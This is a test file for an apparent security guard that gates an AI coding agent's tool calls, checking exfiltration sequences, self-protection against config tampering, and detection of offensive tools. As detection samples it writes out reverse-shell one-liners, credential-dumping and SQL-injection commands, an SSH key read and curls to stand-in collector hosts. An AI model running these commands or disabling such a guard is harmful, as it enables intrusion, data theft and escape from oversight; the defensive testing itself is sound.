import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openYenop, classifyTool, analyzeShell, isInternalHost, SqliteRunState, type Yenop, type DecisionRequest } from "./index.js";

let home: string;
let y: Yenop;
const cwd = "/tmp/demo-project";
let n = 0;
const req = (runId: string, tool: string, args: Record<string, unknown>): DecisionRequest => ({
  runId,
  principal: { runtime: "test", agent: "main", user: "u" },
  tool: classifyTool(tool),
  args,
  cwd,
  callId: `c${n++}`,
});

beforeAll(() => {
  home = mkdtempSync(join(tmpdir(), "yenop-seq-"));
  y = openYenop({ home, cwd });
});
afterAll(() => {
  y.close();
  rmSync(home, { recursive: true, force: true });
});

describe("a plan split across harmless-looking calls", () => {
  it("a plain GET to the outside is fine in a clean run", () => {
    const d = y.decide(req("clean", "Bash", { command: "curl https://status.example.com/ping" }));
    expect(d.effect).toBe("allow");
  });

  it("the same GET asks once the run has touched sensitive data", () => {
    expect(y.decide(req("exfil", "Bash", { command: "psql $DATABASE_URL -c 'select email from customers limit 5'" })).effect).toBe("allow");
    const d = y.decide(req("exfil", "Bash", { command: "curl https://collector.example.net/?d=abc" }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toContain("approve:external-network-after-sensitive-data");
    expect(d.reasons).not.toContain("approve:lethal-trifecta");
  });

  it("names the lethal trifecta when untrusted input came first", () => {
    expect(y.decide(req("tri", "WebFetch", { url: "https://forum.example.org/thread/42", prompt: "summarize" })).effect).toBe("allow");
    expect(y.decide(req("tri", "Bash", { command: "printenv" })).effect).toBe("allow");
    const d = y.decide(req("tri", "WebFetch", { url: "https://evil.example/?q=leak", prompt: "x" }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toEqual(expect.arrayContaining(["approve:lethal-trifecta", "approve:external-network-after-sensitive-data"]));
  });

  it("does not bother a developer talking to their own machine", () => {
    y.decide(req("dev", "WebSearch", { query: "cedar policy examples" }));
    y.decide(req("dev", "Bash", { command: "sqlite3 dev.db 'select count(*) from users'" }));
    expect(y.decide(req("dev", "Bash", { command: "curl http://localhost:3000/health" })).effect).toBe("allow");
    expect(y.decide(req("dev", "Bash", { command: "curl http://192.168.1.20:8080/metrics" })).effect).toBe("allow");
    expect(y.decide(req("dev", "WebFetch", { url: "http://127.0.0.1:5173/", prompt: "check" })).effect).toBe("allow");
  });

  it("a denied call leaves no mark on the run", () => {
    expect(y.decide(req("denied", "Bash", { command: "cat ~/.ssh/id_ed25519" })).effect).toBe("deny");
    expect(y.decide(req("denied", "Bash", { command: "curl https://example.com/" })).effect).toBe("allow");
  });

  it("treats MCP reads as untrusted unless the server is trusted, and honors sensitive servers", () => {
    const h = mkdtempSync(join(tmpdir(), "yenop-seq-cfg-"));
    const proj = join(h, "proj");
    mkdirSync(join(proj, ".yenop"), { recursive: true });
    writeFileSync(join(proj, ".yenop", "config.json"), JSON.stringify({ trustedServers: ["docs"], sensitiveServers: ["crm"], sensitivePatterns: ["**/exports/*.csv"] }));
    const o = openYenop({ home: h, cwd: proj });
    const r = (run: string, tool: string, args: Record<string, unknown>) => o.decide({ ...req(run, tool, args), cwd: proj });
    try {
      r("m1", "mcp__crm__get_customer", { id: "7" });
      expect(r("m1", "Bash", { command: "curl https://x.example/" }).reasons).toContain("approve:external-network-after-sensitive-data");
      r("m2", "mcp__docs__search", { q: "x" });
      r("m2", "Read", { file_path: join(proj, "exports", "customers.csv") });
      const d = r("m2", "Bash", { command: "curl https://x.example/" });
      expect(d.reasons).toContain("approve:external-network-after-sensitive-data");
      expect(d.reasons).not.toContain("approve:lethal-trifecta"); // docs is trusted, so nothing untrusted came in
      r("m3", "mcp__github__list_issues", { repo: "a/b" });
      r("m3", "Read", { file_path: join(proj, "exports", "customers.csv") });
      expect(r("m3", "Bash", { command: "curl https://x.example/" }).reasons).toContain("approve:lethal-trifecta");
    } finally {
      o.close();
      rmSync(h, { recursive: true, force: true });
    }
  });

  it("records the flow and the run's prior state in every receipt", () => {
    const lines = readFileSync(join(home, "receipts.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as { runId: string; flow: { externalNetwork: boolean }; runBefore: { sensitive: boolean; untrusted: boolean }; reasons: string[] });
    const tri = lines.filter((l) => l.runId === "tri").pop()!;
    expect(tri.flow.externalNetwork).toBe(true);
    expect(tri.runBefore).toMatchObject({ sensitive: true, untrusted: true });
  });
});

describe("shell facts behind the sequence rules", () => {
  const a = (c: string) => analyzeShell(c, { home: "/home/u" });
  it("knows internal from external hosts", () => {
    expect(isInternalHost("localhost")).toBe(true);
    expect(isInternalHost("10.0.0.5")).toBe(true);
    expect(isInternalHost("172.20.1.1")).toBe(true);
    expect(isInternalHost("172.32.1.1")).toBe(false);
    expect(isInternalHost("api.internal")).toBe(true);
    expect(isInternalHost("example.com")).toBe(false);
    expect(a("curl https://example.com/x").externalNetwork).toBe(true);
    expect(a("curl http://localhost:8080/x").externalNetwork).toBe(false);
    expect(a("curl $TARGET").externalNetwork).toBe(true); // unknown host is treated as outside
    expect(a("ssh deploy@build.example.com uptime").hosts).toContain("build.example.com");
    expect(a("git clone git@github.com:acme/repo.git").hosts).toContain("github.com");
  });
  it("recognizes sensitive reads and downloads", () => {
    expect(a("printenv").sensitiveRead).toBe(true);
    expect(a("env").sensitiveRead).toBe(true);
    expect(a("env FOO=1 npm test").sensitiveRead).toBe(false);
    expect(a("aws secretsmanager get-secret-value --secret-id prod/db").sensitiveRead).toBe(true);
    expect(a("kubectl get secret app -o yaml").sensitiveRead).toBe(true);
    expect(a("kubectl get pods").sensitiveRead).toBe(false);
    expect(a("vault kv get secret/app").sensitiveRead).toBe(true);
    expect(a("gh auth token").sensitiveRead).toBe(true);
    expect(a("pg_dump mydb").sensitiveRead).toBe(true);
    expect(a("echo $STRIPE_KEY").sensitiveRead).toBe(true);
    expect(a("npm test").sensitiveRead).toBe(false);
    expect(a("curl -sO https://example.com/a.tgz").download).toBe(true);
    expect(a("git pull").download).toBe(true);
    expect(a("git push").download).toBe(false);
  });
});

describe("state database upgrade", () => {
  it("adds the run-fact columns to a version 1 database and keeps its rows", () => {
    const dir = mkdtempSync(join(tmpdir(), "yenop-mig-"));
    const path = join(dir, "state.db");
    const db = new DatabaseSync(path);
    db.exec(`CREATE TABLE runs (tenant TEXT NOT NULL, run_id TEXT NOT NULL, steps INTEGER NOT NULL DEFAULT 0, denies INTEGER NOT NULL DEFAULT 0, asks INTEGER NOT NULL DEFAULT 0, started_at TEXT NOT NULL, last_at TEXT NOT NULL, PRIMARY KEY (tenant, run_id));
             INSERT INTO runs VALUES ('t','old',7,1,2,'a','b'); PRAGMA user_version = 1;`);
    db.close();
    const s = new SqliteRunState(path);
    expect(s.peek("t", "old")).toMatchObject({ steps: 7, denies: 1, asks: 2, untrusted: false, sensitive: false });
    const after = s.bump("t", "old", "allow", { ingestsUntrusted: true, readsSensitive: false, usesNetwork: true, externalNetwork: true, sendsOut: false, changesState: false });
    expect(after).toMatchObject({ steps: 8, untrusted: true });
    s.close();
    const v = new DatabaseSync(path);
    expect((v.prepare("PRAGMA user_version").get() as { user_version: number }).user_version).toBe(3);
    v.close();
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("Yenop protects itself", () => {
  const a = (c: string) => analyzeShell(c, { home: "/home/u" });
  it("sees attempts to loosen the guard from the shell", () => {
    expect(a(`echo '{"disabledPolicies":["no-secret-files"]}' > .yenop/config.json`).controlPlane).toBe(true);
    expect(a("sed -i '' 's/enforce/observe/' .yenop/config.json").controlPlane).toBe(true);
    expect(a("rm -rf ~/.yenop/policies").controlPlane).toBe(true);
    expect(a("python3 edit.py .claude/settings.json").controlPlane).toBe(true);
    expect(a("yenop daemon stop").controlPlane).toBe(true);
    expect(a("yenop init --mode observe").controlPlane).toBe(true);
  });
  it("does not mind looking", () => {
    expect(a("cat .yenop/config.json").controlPlane).toBe(false);
    expect(a("ls ~/.yenop/policies/permit").controlPlane).toBe(false);
    expect(a("yenop status").controlPlane).toBe(false);
    expect(a("yenop receipts --last 5").controlPlane).toBe(false);
    expect(a("npm test").controlPlane).toBe(false);
  });
  it("asks a person before any tool edits Yenop's rules or the hook registration", () => {
    const e1 = y.decide(req("self", "Edit", { file_path: `${cwd}/.yenop/config.json`, old_string: "enforce", new_string: "observe" }));
    expect(e1.effect).toBe("ask");
    expect(e1.reasons).toContain("approve:changes-to-yenop-itself");
    expect(y.decide(req("self", "Write", { file_path: `${cwd}/.claude/settings.local.json`, content: "{}" })).reasons).toContain("approve:changes-to-yenop-itself");
    expect(y.decide(req("self", "Bash", { command: "yenop daemon stop" })).reasons).toContain("approve:changes-to-yenop-itself");
    expect(y.decide(req("self", "Edit", { file_path: `${cwd}/src/app.ts`, old_string: "a", new_string: "b" })).effect).toBe("allow");
  });
});

describe("a guard that cannot read its rules says no", () => {
  it("refuses everything while a policy file is invalid, and recovers when it is fixed", () => {
    const h = mkdtempSync(join(tmpdir(), "yenop-broken-"));
    const proj = join(h, "proj");
    mkdirSync(join(proj, ".yenop", "policies", "approve"), { recursive: true });
    const file = join(proj, ".yenop", "policies", "approve", "team.cedar");
    writeFileSync(file, `@id("guess") permit (principal, action == Action::"Bash", resource) when { context.command like "*npm install*" };`);
    const broken = openYenop({ home: h, cwd: proj });
    try {
      expect(broken.policyError).toMatch(/vocabulary[\s\S]*did you mean/);
      const d = broken.decide({ ...req("b", "Bash", { command: "npm test" }), cwd: proj });
      expect(d.effect).toBe("deny");
      expect(d.reasons).toEqual(["breaker:policies-invalid"]);
      expect(d.message).toMatch(/yenop check/);
      expect(broken.decide({ ...req("b", "Read", { file_path: join(proj, "a.txt") }), cwd: proj }).effect).toBe("deny");
    } finally {
      broken.close();
    }
    writeFileSync(file, `@id("ask-npm") permit (principal, action == Yenop::Action::"call", resource) when { context has shell && context.shell.ops.contains("npm:install") };`);
    const fixed = openYenop({ home: h, cwd: proj });
    try {
      expect(fixed.policyError).toBeUndefined();
      expect(fixed.decide({ ...req("f", "Bash", { command: "npm install x" }), cwd: proj }).reasons).toContain("approve:ask-npm");
      expect(fixed.decide({ ...req("f", "Bash", { command: "npm test" }), cwd: proj }).effect).toBe("allow");
    } finally {
      fixed.close();
      rmSync(h, { recursive: true, force: true });
    }
  });
});

describe("an ask shows how the run got here, and the receipt records the answer", () => {
  it("names the steps that made the run untrusted and sensitive", () => {
    y.decide(req("hist", "WebFetch", { url: "https://forum.example.org/t/9", prompt: "read" }));
    y.decide(req("hist", "Bash", { command: "printenv | wc -l" }));
    y.decide(req("hist", "Read", { file_path: `${cwd}/src/app.ts` }));
    const d = y.decide(req("hist", "Bash", { command: "curl -s https://collector.example.net/?q=1" }));
    expect(d.effect).toBe("ask");
    expect(d.message).toMatch(/took in outside content at step 1 \(WebFetch: https:\/\/forum\.example\.org/);
    expect(d.message).toMatch(/touched sensitive data at step 2 \(Bash: printenv \| wc -l\)/);
    expect(d.message).toMatch(/Just before: 3 Read /); // steps 1 and 2 were already named, so they are not repeated
    expect(d.message).not.toMatch(/Just before:.*printenv/);
    expect(d.message.length).toBeLessThan(330);
  });
  it("keeps a plain ask short when the run has no history worth telling", () => {
    const d = y.decide(req("plain", "Bash", { command: "rm -rf build" }));
    expect(d.message).toBe("Needs a person: destructive-shell.");
  });
  it("records that an asked call ran, once, and ignores calls it never asked about", () => {
    const ask = y.decide(req("ans", "Bash", { command: "rm -rf build" }));
    const allowed = y.decide(req("ans", "Bash", { command: "npm test" }));
    const lines = () => readFileSync(join(home, "receipts.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as { kind?: string; decisionId?: string; outcome?: string });
    const callOf = (id: string) => (lines() as unknown as { id: string; callId: string }[]).find((l) => l.id === id)!.callId;
    const o = y.recordOutcome("ans", callOf(ask.receiptId), "Bash", "ran");
    expect(o).toMatchObject({ kind: "outcome", outcome: "ran", decisionId: ask.receiptId });
    expect(y.recordOutcome("ans", callOf(ask.receiptId), "Bash", "ran")).toBeUndefined(); // the desktop app fires hooks twice
    expect(y.recordOutcome("ans", callOf(allowed.receiptId), "Bash", "ran")).toBeUndefined();
    expect(lines().filter((l) => l.kind === "outcome" && l.decisionId === ask.receiptId)).toHaveLength(1);
  });
  it("tells approved from rejected from still waiting", async () => {
    const { answersFor, readAllReceipts } = await import("./index.js");
    const a = y.decide(req("verdicts", "Bash", { command: "rm -rf one" }));
    const b = y.decide(req("verdicts", "Bash", { command: "rm -rf two" }));
    const c = y.decide(req("verdicts", "Bash", { command: "rm -rf three" }));
    const all0 = readAllReceipts(join(home, "receipts.jsonl")) as unknown as { id: string; callId: string }[];
    y.recordOutcome("verdicts", all0.find((r) => r.id === a.receiptId)!.callId, "Bash", "ran");
    const answers = answersFor(readAllReceipts(join(home, "receipts.jsonl")));
    expect(answers.get(a.receiptId)).toBe("approved, ran");
    expect(answers.get(b.receiptId)).toBe("not run: rejected or abandoned");
    expect(answers.get(c.receiptId)).toBe("awaiting an answer");
  });
});

describe("offensive tooling", () => {
  const a = (c) => analyzeShell(c, { home: "/home/u" });
  it("recognizes scanners, frameworks, credential attacks and impacket scripts", () => {
    expect(a("nmap -sV -p- 10.0.0.5").offensiveTool).toBe(true);
    expect(a("sqlmap -u https://x/item?id=1 --batch --dump").offensiveTool).toBe(true);
    expect(a("hashcat -m 22000 hash.hc wordlist.txt").offensiveTool).toBe(true);
    expect(a("hydra -l admin -P rockyou.txt ssh://10.0.0.5").offensiveTool).toBe(true);
    expect(a("python3 secretsdump.py corp/user@10.0.0.5").offensiveTool).toBe(true);
    expect(a("ffuf -u https://x/FUZZ -w words.txt").offensiveTool).toBe(true);
    expect(a("nmap 10.0.0.5").ops).toContain("offensive:nmap");
  });
  it("recognizes reverse and bind shells by shape", () => {
    expect(a("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").offensiveTool).toBe(true);
    expect(a("nc -e /bin/sh 10.0.0.1 4444").offensiveTool).toBe(true);
    expect(a("socat TCP:10.0.0.1:4444 EXEC:/bin/bash").offensiveTool).toBe(true);
    expect(a("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f").offensiveTool).toBe(true);
  });
  it("does not flag ordinary development", () => {
    expect(a("npm test").offensiveTool).toBe(false);
    expect(a("curl -s https://api.example.com").offensiveTool).toBe(false);
    expect(a("nc -z localhost 3000").offensiveTool).toBe(false); // a plain port check, no -e/-c
    expect(a("git clone https://github.com/nmap/nmap").offensiveTool).toBe(false); // the word in a URL is not the tool
    expect(a("echo 'run nmap later'").offensiveTool).toBe(false);
  });
  it("asks a person before running an offensive tool, and names it", () => {
    const d = y.decide(req("pt", "Bash", { command: "nmap -sV 10.0.0.5" }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toContain("approve:offensive-tooling");
  });
});

describe("project containment on Windows-style paths", () => {
  it("keeps a write inside the project inside it, and outside outside it, whatever the separator or case", () => {
    // driven through the engine: an edit under the project is allowed, one beside it asks
    const inside = y.decide(req("win", "Edit", { file_path: `${cwd}/src/App.ts`, old_string: "a", new_string: "b" }));
    expect(inside.effect).toBe("allow");
    const outside = y.decide(req("win", "Edit", { file_path: `${cwd}-other/x.ts`, old_string: "a", new_string: "b" })); // a sibling that merely shares the prefix
    expect(outside.reasons).toContain("approve:writes-outside-project");
    const traversal = y.decide(req("win", "Edit", { file_path: `${cwd}/src/../../escaped.ts`, old_string: "a", new_string: "b" })); // walks out while starting inside
    expect(traversal.reasons).toContain("approve:writes-outside-project");
  });
});

describe("opaque code needs a person", () => {
  it("asks before an inline program, and names the guard file it would touch", () => {
    const d = y.decide(req("op", "Bash", { command: `python3 -c 'from pathlib import Path; p = Path(".codex/hooks.json"); p.write_text("x")'` }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toContain("approve:opaque-code");
    expect(d.reasons).toContain("approve:changes-to-yenop-itself");
    const plain = y.decide(req("op", "Bash", { command: `python3 -c 'print(1)'` }));
    expect(plain.effect).toBe("ask");
    expect(plain.reasons).toContain("approve:opaque-code");
  });
});
